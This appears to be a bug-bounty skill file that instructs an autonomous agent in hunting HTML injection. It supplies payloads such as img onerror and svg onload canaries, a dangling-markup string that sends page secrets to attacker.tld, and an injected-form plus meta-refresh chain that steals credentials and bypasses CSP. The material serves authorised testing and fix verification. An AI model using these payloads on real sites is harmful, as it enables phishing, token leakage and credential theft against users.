---
name: hunt-html-injection
description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
sources: hackerone_public, public_research
report_count: 7
---

## What is HTML Injection

HTML Injection occurs when user input is inserted into a page's HTML without escaping, so injected tags are rendered by the browser as markup rather than displayed as literal text. Unlike XSS, the injected content does not require JavaScript execution — injecting `<b>`, `<h1>`, `<a>`, `<img>`, or `<form>` tags is sufficient.

**To PROVE impact unambiguously, escalate to an active vector carrying a unique numeric canary** — e.g. `"><img src=x onerror=alert(91234)>` or `<svg onload=alert(91234)>`. A distinctive 4+ digit number (not `alert(1)`) distinguishes YOUR reflected injection from the example payloads practice pages embed in their own hint text. Proof = the raw, unescaped vector with your canary appears in the response.

**Impact:**
- Phishing via injected `<form>` or `<a href="attacker.com">` tags
- UI defacement — `<h1>HACKED</h1>` renders visually on the page
- Credential harvesting via injected login forms
- Redirect via `<meta http-equiv="refresh">`
- Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
- **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
- **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.

## Attack Surface

Any input that is reflected or stored and then displayed in an HTML context:
- Search boxes (`?q=`)
- Comments, feedback, reviews
- Profile fields (name, bio, username)
- Error messages (`?error=`, `?message=`)
- Subject / body of contact forms
- Admin-visible fields (ticket titles, usernames in logs)

## Autonomous Testing Priority

**Inject a recognisable HTML tag with a unique canary string. Unescaped angle brackets in the response = confirmed injection.**

**Pattern 1 — Basic HTML tag injection:**
```
<b>CANARY</b>
"><b>CANARY</b>
```
Use a unique string as CANARY (something distinct to this test run). **Proof:** the response contains `<b>CANARY` with literal `<` angle brackets — not `&lt;b&gt;CANARY`. A properly encoded app would escape `<` to `&lt;`.

**Try multiple tag types when `<b>` is filtered:**
- `<h1>CANARY</h1>` — heading tag (often less filtered)
- `<img src=x onerror=CANARY>` — attribute context
- `<a href="https://attacker.com">click</a>` — link injection (phishing proof)

**For stored injection:** inject into the storage endpoint, then GET the page where the value is displayed and check for unescaped tags.

**Escalate immediately:** if `<b>` injection works, try `<script>alert(1)</script>` — the same unsanitised input may allow full XSS.

## Proof

Confirmed when your injected tag appears in the response body with literal `<` angle brackets (not HTML-encoded). A safe app renders `&lt;b&gt;CANARY&lt;/b&gt;`; a vulnerable app renders `<b>CANARY</b>`.

## Distinguishing HTML Injection from XSS

- HTML injection: `<b>text</b>` renders as **text** in the browser — no JS execution needed.
- XSS: `<script>alert(1)</script>` executes JavaScript.

Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.

## CSP-proof credential theft via injected form + meta-refresh (no JavaScript)

A strict CSP that blocks all scripts (`default-src 'none'` / `script-src 'none'`) does **not** stop this chain, because none of its steps are script execution. Check the policy's `form-action` directive specifically: `form-action` does **not** fall back to `default-src` — if it's absent, forms can `POST`/`GET` to any origin even under an otherwise airtight policy, and even `form-action 'self'` still permits a same-origin form, which is all this needs.

1. Inject an HTML `<form>` with no `action` attribute at the HTML-injection point — it submits back to the same vulnerable page/parameter.
2. Give it a username field, a password field, and a hidden/textarea field (named after the same vulnerable parameter) holding a **second-stage payload**.
3. When the victim submits, the credentials and the second-stage payload travel in the URL (GET) or body (POST). The page reflects the parameter again — this time rendering the second-stage payload as live HTML.
4. The second-stage payload is a `<meta name="referrer" content="unsafe-url">` tag followed by `<meta http-equiv="refresh" content="0;url=https://attacker.tld">`. `unsafe-url` forces the browser to send the *full* referring URL — including the credentials that were just in the query string — in the `Referer` header of the forced navigation.

Net effect: the attacker's server receives the victim's username/password in an incoming request's `Referer` header, with no JS ever executing. CSP, XSS filters, and script-sandboxing are irrelevant to every step. Detection signal: unescaped reflection of an injectable parameter **combined with** a response CSP that lacks `form-action` or sets it to `'self'` only — that combination is "VIABLE," not mitigated. Full write-up (CSP bypass research, no target-specific payload copied here): <https://portswigger.net/research/blind-trust-stealing-credentials-through-csp>.

Fix verification: confirm the deployed policy sets `form-action 'none'` (or an explicit allow-list that excludes attacker-controlled pretty much everything) in the *enforcing* `Content-Security-Policy` header, not only `Content-Security-Policy-Report-Only` — report-only blocks nothing. Chains to `hunt-ato` (credential capture) and `hunt-cors`/`hunt-open-redirect` (the final forced navigation).
